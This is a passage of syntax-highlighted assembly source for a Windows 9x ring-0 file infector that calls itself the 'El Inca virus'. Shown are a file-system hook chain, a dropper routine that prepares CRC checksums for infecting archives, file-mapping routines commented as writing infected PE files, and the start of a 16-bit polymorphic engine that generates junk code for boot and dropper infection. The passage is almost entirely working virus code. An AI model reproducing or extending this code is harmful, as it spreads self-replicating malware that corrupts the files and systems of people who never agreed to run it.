         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OurFile</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
  </span><span class="sc5">ExitNow</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">24</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">nexthook</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">                            </span><span class="sc1">;continue next caller</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
         </span><span class="sc6">leave</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">FONO98_File_System</span><span class="sc0">


         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'El Inca virus'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">          </span><span class="sc1">;yeahh... this is the name</span><span class="sc0">


</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">PreparateDropper</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">;used for archivers infection</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;here we get the size of file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;copy some shitz and calculate</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitUnmark</span><span class="sc0">                         </span><span class="sc1">;crc16 and crc32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">                      </span><span class="sc1">;alloc memory for loader</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ExitClose</span><span class="sc0">                          </span><span class="sc1">;and vxd</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileBuffer</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PolyDOSFileSize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                             </span><span class="sc1">;zopi loader</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BufferOneHandle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">LHACRC16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">;only LHZ use crc16</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">                            </span><span class="sc1">;crc32 returned in eax for</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                   </span><span class="sc1">;otherz</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">PreparateDropper</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VxDMapFile</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">             </span><span class="sc1">;hey... i also have a map</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">;file function... ;)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_sucess</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_handle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">VMF_ret</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_size</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">VMF_close</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                          </span><span class="sc1">;alloc enought memory for</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">                      </span><span class="sc1">;file and workspace</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_base</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">VMF_close</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_READFILE</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                          </span><span class="sc1">;map it out!</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
         </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">VMF_free</span><span class="sc0">
  </span><span class="sc5">VMF_ret</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VxDMapFile</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">VxDUnMapFile</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc5">VMF_sucess</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
         </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">VMF_close</span><span class="sc0">                       </span><span class="sc1">;should we update it?</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_WRITEFILE</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_size</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_handle</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_base</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;write infected PE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">
  </span><span class="sc5">VMF_close</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
         </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">           </span><span class="sc1">;close it</span><span class="sc0">
  </span><span class="sc5">VMF_free</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">VMF_base</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeAllocMemory</span><span class="sc0">                    </span><span class="sc1">;free allocated memory</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">VxDUnMapFile</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">HEAPSWAP</span><span class="sc4">+</span><span class="sc5">HEAPZEROINIT</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapAllocate</span><span class="sc0">                 </span><span class="sc1">;memory allocation routine</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">AllocMemory</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">DeAllocMemory</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc5">VMMCall</span><span class="sc0"> </span><span class="sc5">_HeapFree</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">DeAllocMemory</span><span class="sc0">



</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">
         </span><span class="sc6">cld</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">;look at this!!!!</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">NextByteCRC</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;our crc32 dont need huge</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                          </span><span class="sc1">;tables or shit like...</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                            </span><span class="sc1">;all calculated at runtime</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
  </span><span class="sc5">NextBitCRC</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
         </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">NoCRC</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08320h</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0edb8h</span><span class="sc0">
  </span><span class="sc5">NoCRC</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextBitCRC</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NextByteCRC</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                            </span><span class="sc1">;thx2zenghxi</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">CRC32</span><span class="sc0">

       </span><span class="sc5">VIRSIZE</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4000H</span><span class="sc0">

</span><span class="sc5">gldr</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">                                     </span><span class="sc1">;our 16bit poly engine</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">pDOSBase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">;designed for boot and dropperz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">offset32</span><span class="sc0"> </span><span class="sc5">rgtbl</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosw</span><span class="sc0">                               </span><span class="sc1">;init regz mirrors</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opcode1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">opcode2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">89h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">_sp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">gtype</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">gfl</span><span class="sc0">
 </span><span class="sc5">@a1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">creg</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">gopc</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasw</span><span class="sc0">                             </span><span class="sc1">;all regz initialized?</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@a1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011111b</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 </span><span class="sc5">@a2</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">garble</span><span class="sc0">                             </span><span class="sc1">;create some junk</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@a2</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">maq</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">maqfile</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000202h</span><span class="sc0">                      </span><span class="sc1">;floppy paramz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0001000fh</span><span class="sc0">                      </span><span class="sc1">;hi=reg</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00020100h</span><span class="sc0">                      </span><span class="sc1">;lo=value</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00037e00h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mxrg</span><span class="sc0">                               </span><span class="sc1">;mix order</span><span class="sc0">
